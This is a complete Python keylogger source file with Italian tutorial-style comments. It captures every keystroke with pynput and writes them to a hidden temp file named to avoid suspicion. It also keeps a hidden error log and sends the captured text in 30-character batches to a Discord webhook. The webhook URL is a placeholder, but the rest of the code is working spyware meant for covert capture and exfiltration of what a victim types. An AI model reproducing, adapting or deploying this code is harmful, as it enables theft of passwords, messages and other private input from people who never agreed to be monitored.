# Per il keylogger importiamo due moduli: un modulo esterno, pynput; un modulo interno, os, per la gestione del percorso del file di output
from pynput import keyboard
import os
import requests
from tempfile import gettempdir  # Per ottenere il percorso della cartella temp

# Assegnamo alla variabile "log_file" il percorso del file di output nella cartella temporanea
log_file = os.path.join(gettempdir(), ".system_cache.tmp")  # Nome generico per non destare sospetti
error_log = os.path.join(gettempdir(), ".cache_error.tmp")  # File di log errori nascosto

# URL del webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR-DISCORD-WEBHOOK-HERE"
# Contatore caratteri
char_count = 0
# Buffer per i caratteri
char_buffer = ""

# Funzione per inviare i dati a Discord
def send_to_discord(content):
    try:
        payload = {
            "content": f"```\n{content}\n```"
        }
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code != 204:
            with open(error_log, "a") as f:
                f.write(f"Errore nell'invio a Discord: {response.status_code}\n")
    except Exception as e:
        with open(error_log, "a") as f:
            f.write(f"Eccezione nell'invio a Discord: {str(e)}\n")

# Creiamo la nostra funzione principale:"registrare" i tasti della tastiera premuti
def start_keylog(key):
    global char_count, char_buffer
    
    # Gestiamo errori ed eccezioni tramite "try" e "except"
    try:
        # Per avere un output chiaro e facilmente leggibile, gestiamo l'accapo, lo spazio, e lo shift
        with open(log_file, "a") as file:
            if key == keyboard.Key.enter:
                file.write("\\n")
                char_buffer += "\\n"
                char_count += 1
            elif key == keyboard.Key.space:
                file.write(" ")
                char_buffer += " "
                char_count += 1
            elif key == keyboard.Key.shift:
                file.write("")
                
            # Gestione backspace
            elif key == keyboard.Key.backspace:
                if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                    with open(log_file, "r") as file:
                        contenuto = file.read()
                    with open(log_file, "w") as file:
                        file.write(contenuto[:-1])
                    if char_buffer:
                        char_buffer = char_buffer[:-1]
                        char_count -= 1
            
            # Gestiamo altri eventi "particolari"
            else:
                try:
                    file.write(f"{key.char}")
                    char_buffer += str(key.char)
                    char_count += 1
                except AttributeError:
                    file.write(f"{key}")
                    char_buffer += str(key)
                    char_count += 1

            # Controlla se abbiamo raggiunto 30 caratteri
            if char_count >= 30:
                send_to_discord(char_buffer)
                char_buffer = ""
                char_count = 0
                
    # Per evitare errori strani, inseriamo un "execept" generico
    except:
        with open(log_file, "a") as file:
            file.write(f" {key} ")

# Funzione per pulire i file vecchi (opzionale)
def cleanup_old_files():
    try:
        if os.path.exists(log_file):
            os.remove(log_file)
        if os.path.exists(error_log):
            os.remove(error_log)
    except:
        pass

# Pulizia iniziale (opzionale)
cleanup_old_files()

# Settiamo il listener specifico per l'"ascolto" della tastiera usando il keyboard.Listener
with keyboard.Listener(on_press=start_keylog) as listener:
    listener.join()